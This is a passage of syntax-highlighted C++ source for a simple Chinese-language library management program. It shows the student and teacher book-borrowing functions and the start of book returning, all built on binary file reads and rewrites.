borrow_write;</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID == student_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(add_ownbook.ownbook_name, borrow.book_name);</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID != student_ID) &#123;</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::out);</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num--;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream borrow_read;</span><br><span class="line">							fstream borrow_write;</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID == student_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(add_ownbook.ownbook_name, borrow.book_name);</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID != student_ID) &#123;</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::out);</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;students_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">open</span>(<span class="string">&quot;students_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num--;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">default</span>: &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:\t&quot;</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		readfile1.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile1)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid2.book_name, borrow.book_name)) &#123;</span><br><span class="line">					writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">					writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">					writefile.<span class="built_in">clear</span>();</span><br><span class="line">					writefile.<span class="built_in">close</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile2.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile2.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile2)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile2.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">				writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">clear</span>();</span><br><span class="line">				writefile.<span class="built_in">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			readfile2.<span class="built_in">close</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//馆内暂无该书籍时</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内暂无《&quot;</span> &lt;&lt; borrow.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否要继续借阅(Y/N):\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> judge1;</span><br><span class="line">		<span class="comment">//判断是否进行下一次添加</span></span><br><span class="line">		<span class="keyword">int</span> judge2 = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//判断输入字符有效性</span></span><br><span class="line">		<span class="keyword">while</span> (judge2) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">			<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，请重新输入:\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//教师借书函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Teachers::borrow</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream writefile;</span><br><span class="line">	fstream readfile1;</span><br><span class="line">	<span class="comment">//读取books.dat</span></span><br><span class="line">	fstream readfile2;</span><br><span class="line">	<span class="comment">//读取books_copy.dat</span></span><br><span class="line">	book borrow;</span><br><span class="line">	book mid1;</span><br><span class="line">	<span class="comment">//读取文件，遍历结构体中的书籍名</span></span><br><span class="line">	book mid2;</span><br><span class="line">	<span class="comment">//读取文件，存储非添加书籍的结构体</span></span><br><span class="line">	teachers add_ownbook;</span><br><span class="line">	<span class="comment">//在文件里添加借阅书籍信息</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断书籍是否已存在</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要借阅的书籍名:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; borrow.book_name;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!readfile1)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">			<span class="keyword">if</span> ((<span class="built_in">strcmp</span>(mid1.book_name, borrow.book_name) == <span class="number">0</span>) &amp;&amp; (mid1.book_num != <span class="number">0</span>)) &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内现有《&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; mid1.book_num &lt;&lt; <span class="string">&quot;本&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****书籍信息*****\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; mid1.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; mid1.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否确定借阅？(Y/N)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">char</span> judge;</span><br><span class="line">				<span class="comment">//判断是否确定借阅</span></span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">					<span class="comment">//判断什么时候跳出此while循环</span></span><br><span class="line">					<span class="built_in">cin</span> &gt;&gt; judge;</span><br><span class="line">					<span class="built_in">cin</span>.ignore();</span><br><span class="line">					<span class="keyword">switch</span> (judge) &#123;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;Y&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							fstream borrow_read;</span><br><span class="line">							fstream borrow_write;</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID == teacher_ID) &#123;</span><br><span class="line">									<span class="built_in">strcpy</span>(add_ownbook.ownbook_name, borrow.book_name);</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								<span class="keyword">if</span> (add_ownbook.ID != teacher_ID) &#123;</span><br><span class="line">									borrow_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">									borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">									borrow_write.<span class="built_in">close</span>();</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::out);</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							borrow_read.<span class="built_in">open</span>(<span class="string">&quot;teachers_info_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">							<span class="keyword">while</span> (!borrow_read.eof()) &#123;</span><br><span class="line">								<span class="keyword">if</span> (!borrow_read)</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								borrow_read.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">open</span>(<span class="string">&quot;teachers_info.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">								borrow_write.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;add_ownbook, <span class="keyword">sizeof</span> add_ownbook);</span><br><span class="line">								borrow_write.<span class="built_in">close</span>();</span><br><span class="line">							&#125;</span><br><span class="line">							borrow_read.<span class="built_in">close</span>();</span><br><span class="line">							mid1.book_num--;</span><br><span class="line">							writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::out | ios::binary);</span><br><span class="line">							writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">							writefile.<span class="built_in">clear</span>();</span><br><span class="line">							writefile.<span class="built_in">close</span>();</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;y&#x27;</span>: &#123;</span><br><span class="line"></span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>: &#123;</span><br><span class="line">							n = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">default</span>: &#123;</span><br><span class="line">							<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;无效字符! 请重新输入:\t&quot;</span>;</span><br><span class="line">							<span class="keyword">break</span>;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (n == <span class="number">1</span>)</span><br><span class="line">						<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		readfile1.<span class="built_in">close</span>();</span><br><span class="line">		<span class="comment">//*****注意关闭文件！未关闭文件时指针一直在文件结尾*****</span></span><br><span class="line">		<span class="keyword">if</span> (m == <span class="number">1</span>) &#123;</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile1)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid2.book_name, borrow.book_name)) &#123;</span><br><span class="line">					writefile.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">					writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">					writefile.<span class="built_in">clear</span>();</span><br><span class="line">					writefile.<span class="built_in">close</span>();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::out);</span><br><span class="line">			readfile1.<span class="built_in">close</span>();</span><br><span class="line">			readfile2.<span class="built_in">open</span>(<span class="string">&quot;books_copy.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">			<span class="keyword">while</span> (!readfile2.eof()) &#123;</span><br><span class="line">				<span class="keyword">if</span> (!readfile2)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				readfile2.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::app | ios::binary);</span><br><span class="line">				writefile.<span class="built_in">write</span>((<span class="keyword">char</span> *)&amp;mid2, <span class="keyword">sizeof</span> mid2);</span><br><span class="line">				writefile.<span class="built_in">clear</span>();</span><br><span class="line">				writefile.<span class="built_in">close</span>();</span><br><span class="line">			&#125;</span><br><span class="line">			readfile2.<span class="built_in">close</span>();</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (m == <span class="number">0</span>) &#123;	<span class="comment">//馆内暂无该书籍时</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内暂无《&quot;</span> &lt;&lt; borrow.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否要继续借阅(Y/N):\t&quot;</span>;</span><br><span class="line">		<span class="keyword">char</span> judge1;</span><br><span class="line">		<span class="comment">//判断是否进行下一次添加</span></span><br><span class="line">		<span class="keyword">int</span> judge2 = <span class="number">1</span>;</span><br><span class="line">		<span class="comment">//判断输入字符有效性</span></span><br><span class="line">		<span class="keyword">while</span> (judge2) &#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; judge1;</span><br><span class="line">			<span class="built_in">cin</span>.ignore();</span><br><span class="line">			<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">				judge2 = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;输入错误，请重新输入:\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (judge1 == <span class="string">&#x27;Y&#x27;</span> || judge1 == <span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (judge1 == <span class="string">&#x27;N&#x27;</span> || judge1 == <span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//*******************************************************************************************************</span></span><br><span class="line"><span class="comment">//学生还书</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Students::repay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	fstream readfile1;</span><br><span class="line">	fstream readfile2;</span><br><span class="line">	fstream writefile;</span><br><span class="line">	book reply;</span><br><span class="line">	book mid1;</span><br><span class="line">	book mid2;</span><br><span class="line">	students del_ownbook;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; i++) &#123;</span><br><span class="line">		<span class="keyword">int</span> m = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">//判断书籍是否已存在</span></span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;请输入要归还的书籍名:\t&quot;</span>;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; reply.book_name;</span><br><span class="line">		<span class="built_in">cin</span>.ignore();</span><br><span class="line">		readfile1.<span class="built_in">open</span>(<span class="string">&quot;books.dat&quot;</span>, ios::in | ios::binary);</span><br><span class="line">		<span class="keyword">while</span> (!readfile1.eof()) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!readfile1)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			readfile1.<span class="built_in">read</span>((<span class="keyword">char</span> *)&amp;mid1, <span class="keyword">sizeof</span> mid1);</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">strcmp</span>(mid1.book_name, reply.book_name) == <span class="number">0</span>) &#123;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;馆内现有《&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="string">&quot;》&quot;</span> &lt;&lt; mid1.book_num &lt;&lt; <span class="string">&quot;本&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				m = <span class="number">1</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*****书籍信息*****\n&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍名称:\t&quot;</span> &lt;&lt; mid1.book_name &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍作者:\t&quot;</span> &lt;&lt; mid1.book_author &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;书籍位置:\t&quot;</span> &lt;&lt; mid1.book_location &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;是否确定归还？(Y/N)&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">				<span class="keyword">char</span> judge;</span><br><span class="line">				<span class="comment">//判断是否确定归还</span></span><br><span class="line">				<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">					<span 